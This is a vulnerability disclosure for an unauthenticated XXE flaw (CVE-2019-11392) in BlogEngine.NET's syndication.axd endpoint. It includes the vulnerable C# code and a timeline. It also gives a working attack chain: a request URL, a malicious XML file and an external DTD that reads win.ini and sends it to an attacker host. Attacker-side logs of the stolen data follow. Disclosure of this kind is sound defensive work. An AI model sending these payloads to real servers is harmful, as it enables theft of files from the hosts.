An Out-of-band XML External Entity attack, CVE-2019-11392, exists on BlogEngine.NET versions 3.3.7 and earlier through the `/syndication.axd` endpoint.  This issue can be exploited to reveal the contents of files on the host. Authentication is not required.

## Vendor Patch

* <https://github.com/rxtur/BlogEngine.NET/releases>

## Timeline

* Identified: 21 Apr 2019
* Initial Developer Contact: 22 Apr 2019
* Issue Disclosed: 18 June 2019

## Description

The vulnerable code can be found here:

~~~{command="SyndicationHandler.cs"}
if (!string.IsNullOrEmpty(context.Request.QueryString["apml"]))
{
	// Finds matches to  an APML file in both posts and pages
	try
	{
		using (var client = new WebClient())
		{
			client.Credentials = CredentialCache.DefaultNetworkCredentials;
			client.Encoding = Encoding.Default;
			using (var stream = client.OpenRead(context.Request.QueryString["apml"]))
			{
				var doc = new XmlDocument();
				if (stream != null)
				{
					doc.Load(stream);
				}
~~~

The **apml** parameter parses an XML located at the path provided by the user.  The path can be on a remote host.

An unauthenticated user can submit a malicious request specifying an external XML such as:

~~~
http://$RHOST/blog/syndication.axd?apml=http://$LHOST/oob.xml
~~~

~~~{.xml}
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "https://$LHOST/exfil.dtd">
<foo>&e1;</foo>
~~~

The malicious XML instructs the parser to request a DTD (document type definition) from an external host:

~~~
$RHOST - - [01/Apr/2019:16:34:40 -0600] "GET /exfil.dtd HTTP/1.1" 200 326 "-" "-"
~~~

<pagebreak></pagebreak>

The external DTD is then parsed and instructs the application to read a local file:

~~~{.xml}
<!ENTITY % p1 SYSTEM "file:///C:/WINDOWS/win.ini">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://$LHOST/EX?%p1;'>">
%p2;
~~~

The contents of the local file, `C:/WINDOWS/win.ini` in the example, are then sent in a subsequent request to the attacker:

~~~
$RHOST - - [01/Apr/2019:16:34:40 -0600] "GET /EX?;%20for%2016-bit%20app%20support%0D%0A[fonts]%0D%0A[extensions]%0D%0A[mci%20extensions]%0D%0A[files]%0D%0A[Mail]%0D%0AMAPI=1%0D%0A[MCI%20Extensions.BAK]%0D%0A3g2=MPEGVideo%0D%0A3gp=MPEGVideo%0D%0A3gp2=MPEGVideo%0D%0A3gpp=MPEGVideo%0D%0Aaac=MPEGVideo%0D%0Aadt=MPEGVideo%0D%0Aadts=MPEGVideo%0D%0Am2t=MPEGVideo%0D%0Am2ts=MPEGVideo%0D%0Am2v=MPEGVideo%0D%0Am4a=MPEGVideo%0D%0Am4v=MPEGVideo%0D%0Amod=MPEGVideo%0D%0Amov=MPEGVideo%0D%0Amp4=MPEGVideo%0D%0Amp4v=MPEGVideo%0D%0Amts=MPEGVideo%0D%0Ats=MPEGVideo%0D%0Atts=MPEGVideo HTTP/1.1" 404 438 "-" "-"
~~~

## [Exploit](exploit.py)

Requests the contents of specified files (or `C:/Windows/win.ini` by default). It then writes the files to the current folder:

~~~
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
~~~
